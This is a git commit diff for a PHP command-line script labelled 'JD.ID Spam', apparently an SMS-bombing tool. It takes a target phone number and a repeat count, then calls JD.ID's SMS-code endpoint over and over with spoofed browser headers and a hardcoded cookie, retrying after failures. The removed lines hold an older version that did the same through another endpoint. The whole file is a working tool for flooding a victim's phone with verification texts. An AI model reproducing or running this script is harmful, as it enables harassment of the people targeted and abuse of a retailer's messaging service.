cf5cdc2dcb336df4427088c1accb3c318c9a5918
Anon6372098 <43740735+Anon6372098@users.noreply.github.com>
2018-11-01 14:35:37 +0700

    Add files via upload

--- module/jdid.php
+++ module/jdid.php
@@ -1,32 +1,51 @@
 <?php
-function jdidbom($no, $jum, $wait){
-    $x = 0; 
-    while($x < $jum) {
-        $ch = curl_init();
-        curl_setopt($ch, CURLOPT_URL,"http://sc.jd.id/phone/sendPhoneSms");
-        curl_setopt($ch, CURLOPT_POST, 1);
-        curl_setopt($ch, CURLOPT_POSTFIELDS,"phone=".$no."&smsType=1");
-        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-		curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
-		curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
-		curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
-        curl_setopt($ch, CURLOPT_REFERER, 'http://sc.jd.id/phone/bindingPhone.html');
-        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36');
-        $server_output = curl_exec ($ch);
-        curl_close ($ch);
-		echo $server_output."\n";
-        sleep($wait);
-        $x++;
-        flush();
-    }
+
+/* 
+JD.ID Spam
+Spam by : Anon6372098
+Github : https://github.com/ilhamhax0r
+*/
+
+echo "\e[93mJD.ID Spam
+\e[36m===========\e[91m>>>>>>>>>>\n\e[36mSpam by : Anon6372098
+Github : https://github.com/Anon6372098
+\e[36m===========\e[91m>>>>>>>>>>";
+echo "\n\e[36mNo Target : ";
+$no = trim(fgets(STDIN, 1024));
+echo "Count     : ";
+$loop = trim(fgets(STDIN, 1024));
+echo "\e[36m===========\e[91m>>>>>>>>>>\n\e[96m\e[5mResults:\n";
+for ($x=1; $x<=$loop; $x++) {
+	$c = curl_init();
+	curl_setopt($c, CURLOPT_URL, "https://passport.jd.id/sms/sendSMSCode");
+	curl_setopt($c, CURLOPT_USERAGENT, "Mozilla/5.0 (iPhone; U; CPU iPhone OS 3_0 like Mac OS X; en-us) AppleWebKit/528.18 (KHTML, like Gecko) Version/4.0 Mobile/7A341 Safari/528.16");
+	curl_setopt($c, CURLOPT_SSL_VERIFYHOST, 0);
+	curl_setopt($c, CURLOPT_SSL_VERIFYPEER, 0);
+	curl_setopt($c, CURLOPT_RETURNTRANSFER, 1);
+	curl_setopt($c, CURLOPT_HTTPHEADER, array(
+	    'Accept: application/json, text/javascript, */*; q=0.01',
+	    'Accept-Language: en-US,en;q=0.5',
+	    'Content-Type: application/x-www-form-urlencoded; charset=utf-8',
+	    'Connection: keep-alive',
+	    'Host: passport.jd.id',
+	    'Cookie: __jda=161319996.15195775008192065165156.1519577501.1519892386.1523711222.3',
+	    'Referer: https://passport.jd.id/register/phone',
+	    'X-Requested-With: XMLHttpRequest'
+	));
+	curl_setopt($c, CURLOPT_POSTFIELDS,"phone=".$no);
+	curl_setopt($c, CURLOPT_POST, 1);
+	$hasil = curl_exec($c);
+	if ($hasil == "true") {
+		echo "\e[92m$x. Code has been sent :)\n";
+		flush();
+		sleep(1);
+	} else {
+		$loop += 1;
+		echo "\e[91m$x. Code failed to send :(\n\e[97mCount +1\n".($loop-$x)." remaining\n\e[93mSleep in 60s\n";
+		flush();
+		sleep(60);
+	}
 }
-echo "Nomor? (ex : 8xxxx)\nInput : ";
-$nomor = trim(fgets(STDIN));
-echo "Jumlah?\nInput : ";
-$jumlah = trim(fgets(STDIN));
-echo "Jeda? 0-9999999999 (ex:0)\nInput : ";
-$jeda = trim(fgets(STDIN));
-$execute = jdidbom($nomor, $jumlah, $jeda);
-print $execute;
-print "DONE ALL SEND\n";
+echo "\e[36m===========\e[91m>>>>>>>>>>\n";
+echo "\e[39mThanks ^_^";
 ?>
